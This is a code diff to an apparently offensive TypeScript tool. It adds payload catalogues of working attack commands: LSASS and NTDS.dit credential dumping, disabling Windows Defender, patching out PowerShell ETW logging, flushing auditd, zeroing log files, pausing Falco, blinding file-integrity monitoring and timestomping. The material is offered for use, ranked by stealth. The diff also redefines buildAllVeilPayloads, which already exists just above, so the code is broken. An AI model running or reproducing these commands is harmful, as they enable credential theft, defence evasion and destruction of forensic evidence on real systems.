@@ -394,3 +394,74 @@ export function buildAllVeilPayloads(lhost: string, lport: string): VeilPayload[
     ...buildCloudPivotPayloads(lhost, lport),
   ];
 }
+
+export function buildEdrDumpBypass(lhost: string, lport: string): VeilPayload[] {
+  return [
+    { id:"lsass_dump_comsvcs", name:"LSASS dump via comsvcs.dll MiniDump (LOLBin)", category:"Credential-Dump",
+      os:"windows", phase:"during", stealth:4,
+      command:`powershell -NonI -W Hidden -c "rundll32 C:\\Windows\\System32\\comsvcs.dll MiniDump (Get-Process lsass).Id $env:TEMP\\nx_lsass.dmp full" 2>nul`,
+      notes:"comsvcs.dll MiniDump is signed Microsoft DLL. Creates full LSASS dump. Parse offline with Mimikatz/pypykatz. Requires SYSTEM or SeDebugPrivilege." },
+    { id:"ntds_dit_vss", name:"NTDS.dit extraction via VSS shadow copy", category:"AD-Dump",
+      os:"windows", phase:"during", stealth:3,
+      command:`powershell -NonI -W Hidden -c "$s=Get-WmiObject Win32_ShadowCopy|Select -Last 1; if(!$s){$c=[wmiclass]'Win32_ShadowCopy';$r=$c.Create('C:\\\\','ClientAccessible');$s=Get-WmiObject Win32_ShadowCopy|?{$_.ID -eq $r.ShadowID}}; cmd /c copy /y \"\$($s.DeviceObject)\\Windows\\NTDS\\NTDS.dit\" $env:TEMP\\nx_ntds.dit; reg save HKLM\\SYSTEM $env:TEMP\\nx_sys.hiv /y" 2>nul`,
+      notes:"VSS shadow copy bypass for NTDS.dit. Parse with impacket secretsdump. Requires Domain Admin." },
+    { id:"windows_defender_excl", name:"Windows Defender exclusion add", category:"AV-Evasion",
+      os:"windows", phase:"before", stealth:4,
+      command:`powershell -NonI -W Hidden -Exec Bypass -c "Add-MpPreference -ExclusionPath @('C:\\Windows\\Temp','$env:TEMP') -ExclusionProcess @('powershell.exe','cmd.exe') -ExclusionExtension @('.ps1','.bat') 2>nul; Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true -DisableBlockAtFirstSeen $true 2>nul"`,
+      notes:"Adds Defender exclusions for attacker paths/processes. Shuts off on-access scanning. Requires admin/SYSTEM." },
+    { id:"etw_patch_powershell", name:"ETW patching in PowerShell (disable PS logging)", category:"EDR-Bypass",
+      os:"windows", phase:"before", stealth:5,
+      command:`powershell -NonI -W Hidden -c "[Reflection.Assembly]::LoadWithPartialName('System.Core')|Out-Null;$type=[System.Management.Automation.Tracing.PSEtwLogProvider];$field=$type.GetField('etwProvider','NonPublic,Static');$provider=$field.GetValue($null);$prov_type=$provider.GetType();$enabled_field=$prov_type.GetField('m_enabled','NonPublic,Instance');$enabled_field.SetValue($provider,0)" 2>nul`,
+      notes:"Patches PowerShell ETW provider in-process — disables ScriptBlock logging, module logging, all PS telemetry." },
+  ];
+}
+
+export function buildAuditdEvasion(): VeilPayload[] {
+  return [
+    { id:"auditd_rule_flush", name:"auditd rule flush (disable all audit logging)", category:"Anti-Forensics",
+      os:"linux", phase:"before", stealth:2,
+      command:`auditctl -D 2>/dev/null && auditctl -e 0 2>/dev/null && systemctl stop auditd 2>/dev/null`,
+      notes:"Flushes all auditd rules, disables audit, stops daemon. Requires root. Complete audit trail destruction." },
+    { id:"syslog_truncate", name:"Syslog truncation (zero all log files)", category:"Anti-Forensics",
+      os:"linux", phase:"after", stealth:3,
+      command:`for _F in /var/log/auth.log /var/log/syslog /var/log/messages /var/log/secure /var/log/audit/audit.log /var/log/lastlog /var/log/wtmp /var/log/btmp; do [ -w "$_F" ] && truncate -s 0 "$_F" 2>/dev/null && echo "zeroed: $_F"; done`,
+      notes:"Truncates (not deletes) log files — avoids inode creation events. Zeroes auth, syslog, audit, wtmp records." },
+    { id:"falco_evasion", name:"Falco/Sysdig pause via SIGSTOP", category:"Anti-Forensics",
+      os:"linux", phase:"before", stealth:5,
+      command:`for name in falco sysdig falco-probe; do pkill -STOP "$name" 2>/dev/null; done; unshare --pid --mount -- bash -c "mount -t proc proc /proc" 2>/dev/null &`,
+      notes:"SIGSTOP Falco/sysdig to pause monitoring. unshare --pid creates new PID namespace hiding processes from host /proc." },
+    { id:"fim_inotify_exhaust", name:"FIM evasion via inotify fd exhaustion", category:"Anti-Forensics",
+      os:"linux", phase:"before", stealth:5,
+      command:`python3 -c "
+import os,signal,time
+watches=[]
+try:
+  for i in range(8192):
+    fd=os.inotify_init()
+    watches.append(fd)
+    os.inotify_add_watch(fd,'/tmp',0xfff)
+except: pass
+print(f'Exhausted {len(watches)} inotify fds — FIM blinded')
+time.sleep(300)
+" &`,
+      notes:"Exhausts system inotify watch descriptors — FIM tools (Tripwire, OSSEC, Wazuh) can no longer add new watches." },
+    { id:"timestomp_modify", name:"Timestamp stomp (MACE times)", category:"Anti-Forensics",
+      os:"linux", phase:"after", stealth:5,
+      command:`_F=\${1:-/tmp/.nx}; touch -d "2020-01-01 00:00:00" "$_F" 2>/dev/null; python3 -c "import os; os.utime('$_F',(1577836800,1577836800))" 2>/dev/null`,
+      notes:"Modifies mtime/atime to 2020-01-01. Destroys forensic timeline anchoring." },
+  ];
+}
+
+export function buildAllVeilPayloads(lhost: string, lport: string): VeilPayload[] {
+  return [
+    ...buildLinuxAntiForensics(),
+    ...buildWindowsEdrEvasion(),
+    ...buildLotlLinuxPayloads(lhost, lport),
+    ...buildSupplyChainPayloads(lhost, lport),
+    ...buildContainerEscapePayloads(lhost, lport),
+    ...buildK8sPayloads(lhost, lport),
+    ...buildCloudPivotPayloads(lhost, lport),
+    ...buildEdrDumpBypass(lhost, lport),
+    ...buildAuditdEvasion(),
+  ];
+}
